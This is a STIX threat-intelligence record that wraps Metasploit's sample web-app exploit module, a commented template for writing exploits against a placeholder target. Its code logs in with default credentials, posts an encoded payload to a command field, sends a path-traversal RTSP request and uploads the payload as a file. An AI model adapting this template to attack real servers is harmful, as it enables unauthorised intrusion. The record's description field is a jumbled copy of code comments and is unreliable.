{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5639fa88-9c96-496c-bc8e-e21a7fb438ae",
    "created": "2024-08-14T16:33:22.603712Z",
    "modified": "2024-08-14T16:33:22.603718Z",
    "name": "Sample Webapp Exploit",
    "description": " This exploit module illustrates how a vulnerability could be exploited in a webapp.  'License' => MSF_LICENSE # The place to add your name/handle and email.  Twitter and other contact info isn't handled here. # Add reference to additional authors, like those creating original proof of concepts or # reference materials. # It is also common to comment in who did what (PoC vs metasploit module, etc)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/example_webapp.rb",
            "external_id": "example_webapp.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.example.com"
        },
        {
            "source_name": "CVE",
            "external_id": "1978-1234"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n###\n#\n# This exploit sample shows how an exploit module could be written to exploit\n# a bug in an arbitrary web server\n#\n###\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html\n\n  #\n  # This exploit affects a webapp, so we need to import HTTP Client\n  # to easily interact with it.\n  #\n  include Msf::Exploit::Remote::HttpClient\n\n  # There are libraries for several CMSes such as WordPress, Typo3,\n  # SharePoint, Nagios XI, Moodle, Joomla, JBoss, and Drupal.\n  #\n  # The following import just includes the code for the WordPress library,\n  # however you can find other similar libraries at\n  # https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/exploit/remote/http\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        # The Name should be just like the line of a Git commit - software name,\n        # vuln type, class. Preferably apply\n        # some search optimization so people can actually find the module.\n        # We encourage consistency between module name and file name.\n        'Name' => 'Sample Webapp Exploit',\n        'Description' => %q{\n          This exploit module illustrates how a vulnerability could be exploited\n          in a webapp.\n        },\n        'License' => MSF_LICENSE,\n        # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.\n        # Add reference to additional authors, like those creating original proof of concepts or\n        # reference materials.\n        # It is also common to comment in who did what (PoC vs metasploit module, etc)\n        'Author' => [\n          'h00die <mike@stcyrsecurity.com>', # msf module\n          'researcher' # original PoC, analysis\n        ],\n        'References' => [\n          [ 'OSVDB', '12345' ],\n          [ 'EDB', '12345' ],\n          [ 'URL', 'http://www.example.com'],\n          [ 'CVE', '1978-1234']\n        ],\n        # platform refers to the type of platform.  For webapps, this is typically the language of the webapp.\n        # js, php, python, nodejs are common, this will effect what payloads can be matched for the exploit.\n        # A full list is available in lib/msf/core/payload/uuid.rb\n        'Platform' => ['python'],\n        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access\n        'Privileged' => false,\n        # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but for webapps typically\n        # this is the application language. ARCH_PYTHON, ARCH_PHP, ARCH_JAVA are some examples\n        # A full list is available in lib/msf/core/payload/uuid.rb\n        'Arch' => ARCH_PYTHON,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2023-12-30',\n        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.\n        # It's generally easiest just to put the default at the beginning of the list and skip this\n        # entirely.\n        'DefaultTarget' => 0,\n        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n    # set the default port, and a URI that a user can set if the app isn't installed to the root\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', '123456']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Example Application', '/example/'])\n      ]\n    )\n  end\n\n  #\n  # The sample exploit checks the index page to verify the version number is exploitable\n  # we use a regex for the version number\n  #\n  def check\n    # only catch the response if we're going to use it, in this case we do for the version\n    # detection.\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET'\n    )\n    # gracefully handle if res comes back as nil, since we're not guaranteed a response\n    # also handle if we get an unexpected HTTP response code\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") if res.code == 200\n\n    # here we're looking through html for the version string, similar to:\n    # Version 1.2\n    %r{Version: (?<version>\\d{1,2}\\.\\d{1,2})</td>} =~ res.body\n\n    if version && Rex::Version.new(version) <= Rex::Version.new('1.3')\n      CheckCode::Appears(\"Version Detected: #{version}\")\n    end\n\n    CheckCode::Safe\n  end\n\n  #\n  # The exploit method attempts a login, then attempts to throw a command execution\n  # at a web page through a POST variable\n  #\n  def exploit\n    # attempt a login. In this case we show basic auth, and a POST to a fake username/password\n    # simply to show how both are done\n    vprint_status('Attempting login')\n    # since we will check res to see if auth was a success, make sure to capture the return\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'login.php'),\n      'method' => 'POST',\n      'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n      # automatically handle cookies with keep_cookies.  Alternatively use cookie = res.get_cookies and 'cookie' => cookie,\n      'keep_cookies' => true,\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      },\n      'vars_get' => {\n        'example' => 'example'\n      }\n    )\n\n    # a valid login will give us a 301 redirect to /home.html so check that.\n    # ALWAYS assume res could be nil and check it first!!!!!\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") unless res.code == 301\n\n    # we don't care what the response is, so don't bother saving it from send_request_cgi\n    # datastore['HttpClientTimeout'] ONLY IF we need a longer HTTP timeout\n    vprint_status('Attempting exploit')\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'command.html'),\n      'method' => 'POST',\n      'vars_post' =>\n      {\n        'cmd_str' => payload.encoded\n      }\n    }, datastore['HttpClientTimeout'])\n\n    # send_request_raw is used when we need to break away from the HTTP protocol in some way for the exploit to work\n    send_request_raw({\n      'method' => 'DESCRIBE',\n      'proto' => 'RTSP',\n      'version' => '1.0',\n      'uri' => '/' + ('../' * 560) + \"\\xcc\\xcc\\x90\\x90\" + '.smi'\n    }, datastore['HttpClientTimeout'])\n\n    # example of sending a MIME message\n    data = Rex::MIME::Message.new\n    # https://github.com/rapid7/rex-mime/blob/master/lib/rex/mime/message.rb\n    file_contents = payload.encoded\n    data.add_part(file_contents, 'application/octet-stream', 'binary', \"form-data; name=\\\"file\\\"; filename=\\\"uploaded.bin\\\"\")\n    data.add_part('example', nil, nil, \"form-data; name=\\\"_wpnonce\\\"\")\n\n    post_data = data.to_s\n\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => normalize_uri(target_uri.path, 'async-upload.php'),\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => post_data,\n      'cookie'  => cookie\n    )\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-12-30",
    "x_mitre_platforms": [
        "['python']"
    ]
}